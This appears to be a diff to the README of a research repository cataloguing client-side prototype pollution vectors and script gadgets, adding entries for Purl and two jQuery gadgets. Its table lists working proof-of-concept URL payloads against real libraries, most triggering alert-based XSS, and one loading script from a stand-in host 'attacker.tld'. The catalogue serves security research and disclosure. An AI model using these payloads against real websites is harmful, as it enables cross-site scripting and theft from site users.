@@ -22,6 +22,7 @@ In this repository, I am trying to collect examples of libraries that are vulner
 | [MooTools More](/pp/mootools-more.md)                             | `?__proto__[test]=test`<br>`?constructor[prototype][test]=test`          |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
 | [Swiftype Site Search (**Fixed**)](/pp/swiftype-site-search.md)   | `#__proto__[test]=test`                                                  |                                             | [s1r1us](https://twitter.com/S1r1u5_)            |
 | [CanJS deparam](/pp/canjs-deparam.md)                             | `?__proto__[test]=test`<br>`?constructor[prototype][test]=test`          |                                             | [Rahul Maini](https://twitter.com/iamnoooob)     |
+| [Purl (jQuery-URL-Parser)](/pp/purl.md)                           | `?__proto__[test]=test`<br>>`?constructor[prototype][test]=test`<br>`#__proto__[test]=test`|                           | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
 
 ## Script Gadgets
 
@@ -31,6 +32,8 @@ In this repository, I am trying to collect examples of libraries that are vulner
 | [jQuery $.get >= 3.0.0](/gadgets/jquery.md)             | `?__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script`               | XSS               |                                                   | [Michał Bentkowski](https://twitter.com/SecurityMB) |
 | [jQuery $.getScript >= 3.4.0](/gadgets/jquery.md)       | `?__proto__[src][]=data:,alert(1)//`                                          | XSS               |                                                   | [s1r1us](https://twitter.com/S1r1u5_)               |
 | [jQuery $.getScript 3.0.0 - 3.3.1](/gadgets/jquery.md)  | `?__proto__[url]=data:,alert(1)//`                                            | XSS               |                                                   | [s1r1us](https://twitter.com/S1r1u5_)               |
+| [jQuery $(html)](/gadgets/jquery.md)                    | `?__proto__[div][0]=1&__proto__[div][1]=<img src onerror%3dalert(1)>&__proto__[div][2]=1`| XSS    |                                                   | [Sergey Bobrov](https://twitter.com/Black2Fan)      |
+| [jQuery $(x).off](/gadgets/jquery.md)                   | `?__proto__[preventDefault]=x&__proto__[handleObj]=x&__proto__[delegateTarget]=<img/src/onerror%3dalert(document.domain)>`| XSS    |                  | [Sergey Bobrov](https://twitter.com/Black2Fan)      |
 | [Google reCAPTCHA](/gadgets/recaptcha.md)               | `?__proto__[srcdoc][]=<script>alert(1)</script>`                              | XSS               |                                                   | [s1r1us](https://twitter.com/S1r1u5_)               |
 | [Twitter Universal Website Tag](/gadgets/twitter-uwt.md)| `?__proto__[hif][]=javascript:alert(1)`                                       | XSS               |                                                   | [Sergey Bobrov](https://twitter.com/Black2Fan)      |
 | [Tealium Universal Tag](/gadgets/tealium-utag.md)       | `?__proto__[attrs][src]=1&__proto__[src]=//attacker.tld/js.js`                | XSS               |                                                   | [Sergey Bobrov](https://twitter.com/Black2Fan)      |
